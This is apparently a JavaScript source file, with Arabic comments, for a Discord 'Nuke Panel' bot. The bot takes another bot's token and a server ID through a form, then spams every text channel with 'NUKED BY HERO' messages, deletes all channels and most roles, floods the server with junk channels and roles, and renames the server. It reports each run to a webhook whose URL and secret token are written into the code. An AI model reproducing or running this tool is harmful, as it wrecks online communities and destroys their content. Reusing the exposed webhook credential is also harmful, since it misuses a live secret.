const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, PermissionsBitField } = require('discord.js');

// التوكن تبع البوت الأساسي اللي شغال عالمنصة (اللي رح يبعت الأزرار)
const MAIN_TOKEN = process.env.TOKEN;
// الويب هوك تبعك
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1566240069583634545/-hp7VNKkMIKSEYIs3_4vhHvjC4DTBdfLe_Jxk5dA8EyQCbP5yjCGg_zknhtnw1jvuUEc';

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent],
});

async function sendWebhook(content) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content, username: 'Nuke Panel' }),
        });
    } catch (err) {}
}

client.once('ready', () => {
    console.log(`✅ لوحة التحكم جاهزة ومتصلة كـ: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    
    // الأمر الوحيد اللي بضل بالشات عشان يطلع الزر
    if (message.content === '!panel' || message.content === '!nuke') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply('❌ لازم تكون أدمن عشان تطلع اللوحة.');
        }

        const button = new ButtonBuilder()
            .setCustomId('open_nuke_modal')
            .setLabel('جحفلة')
            .setStyle(ButtonStyle.Danger); // لون أحمر

        const row = new ActionRowBuilder().addComponents(button);

        await message.channel.send({
            content: '**💀 لوحة التحكم بالجحفلة 💀**\nاضغط الزر الأحمر لفتح الإعدادات.',
            components: [row]
        });
    }
});

client.on('interactionCreate', async (interaction) => {
    // 1. إذا كبس على الزر الأحمر
    if (interaction.isButton() && interaction.customId === 'open_nuke_modal') {
        const modal = new ModalBuilder()
            .setCustomId('nuke_settings_modal')
            .setTitle('إعدادات الجحفلة');

        // الخانة 1: التوكن
        const tokenInput = new TextInputBuilder()
            .setCustomId('bot_token')
            .setLabel('توكن البوت (Bot Token)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('حط التوكن هنا...')
            .setRequired(true);

        // الخانة 2: ID السيرفر
        const guildIdInput = new TextInputBuilder()
            .setCustomId('guild_id')
            .setLabel('ايدي السيرفر (Guild ID)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('مثال: 123456789012345678')
            .setRequired(true);

        // الخانة 3: السبام وعدد الرسائل
        const spamInput = new TextInputBuilder()
            .setCustomId('spam_count')
            .setLabel('سبام (حط 0 لإلغاء السبام، أو رقم)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('اكتب عدد الرسائل (مثلاً 5)')
            .setRequired(false);

        // الخانة 4: إنشاء رومات
        const createChannelsInput = new TextInputBuilder()
            .setCustomId('create_channels')
            .setLabel('إنشاء رومات (اكتب الاسم أو 0)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('اسم الروم اللي بدك تنشئه')
            .setRequired(false);

        // الخانة 5: إنشاء رولات
        const createRolesInput = new TextInputBuilder()
            .setCustomId('create_roles')
            .setLabel('إنشاء رولات (اكتب الاسم أو 0)')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('اسم الرول اللي بدك تنشئه')
            .setRequired(false);

        modal.addComponents(
            new ActionRowBuilder().addComponents(tokenInput),
            new ActionRowBuilder().addComponents(guildIdInput),
            new ActionRowBuilder().addComponents(spamInput),
            new ActionRowBuilder().addComponents(createChannelsInput),
            new ActionRowBuilder().addComponents(createRolesInput)
        );

        await interaction.showModal(modal);
    }

    // 2. إذا عبى الفورم وكبس "إرسال"
    if (interaction.isModalSubmit() && interaction.customId === 'nuke_settings_modal') {
        await interaction.reply({ content: '⏳ جاري تنفيذ العملية... يرجى الانتظار.', ephemeral: true });

        const botToken = interaction.fields.getTextInputValue('bot_token');
        const guildId = interaction.fields.getTextInputValue('guild_id');
        const spamCount = parseInt(interaction.fields.getTextInputValue('spam_count')) || 0;
        const channelName = interaction.fields.getTextInputValue('create_channels');
        const roleName = interaction.fields.getTextInputValue('create_roles');

        // إنشاء بوت مؤقت بالتوكن اللي حطه المستخدم
        const nukeClient = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });

        nukeClient.once('ready', async () => {
            try {
                const guild = nukeClient.guilds.cache.get(guildId);
                if (!guild) {
                    await interaction.editReply({ content: '❌ ما لقيت السيرفر. تأكد من الـ ID أو إن البوت مضاف فيه.' });
                    nukeClient.destroy();
                    return;
                }

                await sendWebhook(`**🚀 بدأت الجحفلة على السيرفر:** \`${guild.name}\``);

                // سبام
                if (spamCount > 0) {
                    const spamMsg = '💀 **NUKED BY HERO** 💀';
                    for (const ch of guild.channels.cache.values()) {
                        if (!ch.isTextBased()) continue;
                        for (let i = 0; i < spamCount; i++) {
                            await ch.send(spamMsg).catch(() => {});
                        }
                    }
                }

                // إنشاء رومات
                if (channelName && channelName !== '0') {
                    for (let i = 0; i < 5; i++) {
                        await guild.channels.create({ name: `${channelName}-${i+1}` }).catch(() => {});
                    }
                }

                // إنشاء رولات
                if (roleName && roleName !== '0') {
                    for (let i = 0; i < 5; i++) {
                        await guild.roles.create({ name: `${roleName}-${i+1}` }).catch(() => {});
                    }
                }

                // حذف الرومات والرولات
                for (const ch of guild.channels.cache.values()) {
                    await ch.delete().catch(() => {});
                }
                for (const r of guild.roles.cache.values()) {
                    if (r.id === guild.id || r.managed || r.position >= guild.members.me.roles.highest.position) continue;
                    await r.delete().catch(() => {});
                }

                await guild.setName('NUKED-BY-HERO').catch(() => {});

                await interaction.editReply({ content: '✅ تمت الجحفلة بنجاح!' });
                await sendWebhook(`**✅ انتهت الجحفلة بنجاح على:** \`${guild.name}\``);

            } catch (err) {
                await interaction.editReply({ content: `❌ صار خطأ: \`${err.message}\`` });
            } finally {
                nukeClient.destroy(); // إغلاق البوت المؤقت
            }
        });

        nukeClient.login(botToken).catch(async () => {
            await interaction.editReply({ content: '❌ التوكن اللي حطيته غلط أو البوت موقف.' });
        });
    }
});

client.login(MAIN_TOKEN);
